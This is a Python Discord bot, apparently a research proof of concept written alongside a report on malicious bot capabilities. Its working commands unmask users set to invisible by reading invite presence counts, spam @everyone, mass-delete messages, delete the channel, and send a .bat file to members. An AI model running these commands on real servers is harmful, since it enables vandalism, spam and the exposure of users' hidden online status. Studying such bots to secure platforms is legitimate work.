# This is a proof-of-concept for a few things a malicious bot is able to do. 
# For more information, see the report attached with this code.
# Keep in mind that this bot is only designed to be connected to a single server. 

# Importing the Discord.py API 
import discord

# This is used to check which users are online
intents = discord.Intents.all()
client = discord.Client(intents=intents)


# Class to keep state
class State:
    # Amount of members online in the current channel
    online_members = 0

    # Current channel, the last channel where a message was sent to the bot
    current_channel_id = "0"

    # Whether to track presence or not
    track_presence = False

    # Whether this bots status is online or invisible
    visible = True

    # Initialise
    def __init__(self):
        self.online_members = 0
        self.current_channel_id = "0"
        self.track_presence = False
        self.visible = True


state = State()


# Called when connected to Discord.
@client.event
async def on_ready():
    print(f'{client.user} has connected to Discord!')


# Called when a message is received.
@client.event
async def on_message(message):
    # Ignore message if it was sent by this bot.
    if message.author == client.user:
        return

    try:
        # Set initial definitions, and update current channel id
        channel = message.channel
        member = message.author
        content = message.content.lower()
        state.current_channel_id = channel.id

        # Update the amount of online members. Used for tracking presence.
        if state.track_presence == True:
            await updateOnlineMembers()

        # !help - List commands
        if "!help" in content or client.user in message.mentions:
            await message.channel.send("Hello! \nI'm a vulnerability concept bot. I have the following commands:\n" +
                                       "\n" +
                                       "!help - shows this info. \n" +
                                       "!visibility - toggles my status between online and invisible. \n" +
                                       "!trackpresence - toggles whether I should check if users are actually offline or just invisible. \n" +
                                       "!messagehistory - display the latest 10 messages. \n" +
                                       "!getprofile - sends you your own profile picture. \n" +
                                       "!DOSspam - send 10 messages in quick succession. \n" +
                                       "!DOScleanse - removes the 10 latest messages. \n" +
                                       "!DOSdeletechannel - delete this channel! \n" +
                                       "!RCEimage - sends an image. \n" +
                                       "!RCEfile - sends a file. \n" +
                                       "!RCElink - sends a link.")
            return

        # See !help for definition.
        if "!visibility" in content:
            state.visible = not state.visible
            if state.visible:
                await client.change_presence(status=discord.Status.online)
                await message.channel.send("My status is now online. ")
            else:
                await client.change_presence(status=discord.Status.invisible)
                await message.channel.send("My status is now invisible. ")
            return

        # See !help for definition.
        if "!messagehistory" in content:
            history = ""
            async for m in channel.history(limit=10):
                history = m.content + "\n" + history
            await message.channel.send("The latest 10 messages are: \n \n" + history)
            return

        # See !help for definition.
        if "!trackpresence" in content:
            if state.track_presence:
                await message.channel.send("I will stop tracking presence. ")
            else:
                await updateOnlineMembers()
                await message.channel.send("I will alert you when anyone sets their status to invisible. ")
            state.track_presence = not state.track_presence
            return

        # See !help for definition.
        # Saves the message-authors profile pic, and sends it back to them.
        if "!getprofile" in content:
            avatar = await member.avatar_url_as(static_format="png").read()
            f = open('avatar.png', 'wb')
            f.write(bytearray(avatar))
            f.close()

            await channel.send(file=discord.File('avatar.png'))
            return

        # See !help for definition.
        if "!dosspam" in content:
            await message.channel.send("Spamming with 10 messages: ")
            for i in range(10):
                await message.channel.send("Spam @everyone")
            return

        # See !help for definition.
        if "!doscleanse" in content:
            async for m in channel.history(limit=11):
                if "!doscleanse" in m.content.lower():
                    continue
                else:
                    await m.delete()
            await message.channel.send("Deleted the latest 10 messages, excluding the one you just wrote! ")
            return

        # See !help for definition.
        if "!dosdeletechannel" in content:
            await channel.delete()
            return

        # See !help for definition.
        # Instead of having to figure out the file path to an image we provide,
        # we only send our own profile picture. But any picture could be sent. 
        if "!rceimage" in content:
            avatar = await client.user.avatar_url_as(static_format="png").read()
            f = open('avatar.png', 'wb')
            f.write(bytearray(avatar))
            f.close()

            await channel.send(file=discord.File('avatar.png'))
            return

        # See !help for definition.
        # Here, we create a file which will delete itself when executed. 
        # Then we transmit it. 
        if "!rcefile" in content:
            f = open("deleteSelf.bat", "w+")
            f.write("del deleteSelf.bat")
            f.close()
            await channel.send(file=discord.File('deleteSelf.bat'))
            return

        # See !help for definition.
        if "!rcelink" in content:
            await message.channel.send("Check out this cool link: \nhttp://www.neilcic.com/0110/")
            return

    # Catch any exceptions
    except discord.errors.Forbidden:
        await message.channel.send("Something went wrong. I probably don't have permission to do that. ")
        return
    except RuntimeError:
        await message.channel.send("Something went wrong. I probably don't have permission to do that. ")
        return


# This method is called whenever a user changes their status.
@client.event
async def on_member_update(before, after):
    # Do nothing if we are not supposed to track presence
    if state.current_channel_id == "0" or state.track_presence == False:
        return

    channel = await client.fetch_channel(state.current_channel_id)

    # Create an invite link in order to find out how many people are online.
    # (Invite links show how exactly many people are online, as long as it is less than 100. )
    link = await channel.create_invite(max_age=100)
    client_link = await client.fetch_invite(link)
    new_online_members = client_link.approximate_presence_count

    # Compare new online members to old online members.
    # (Invisible users count as online) 
    if after.status == discord.Status.offline:
        if state.online_members == new_online_members:
            if before.nick == None:
                await channel.send(str(before) + " set their status to invisible. ")
            else:
                await channel.send(str(before.nick) + " set their status to invisible. ")

    # Update amount of online members.
    state.online_members = new_online_members


# Update the amount of online members, using invite links as before
async def updateOnlineMembers():
    channel = await client.fetch_channel(state.current_channel_id)
    link = await channel.create_invite(max_age=100)
    client_link = await client.fetch_invite(link)
    state.online_members = client_link.approximate_presence_count

# Place your token here
client.run("TOKEN")
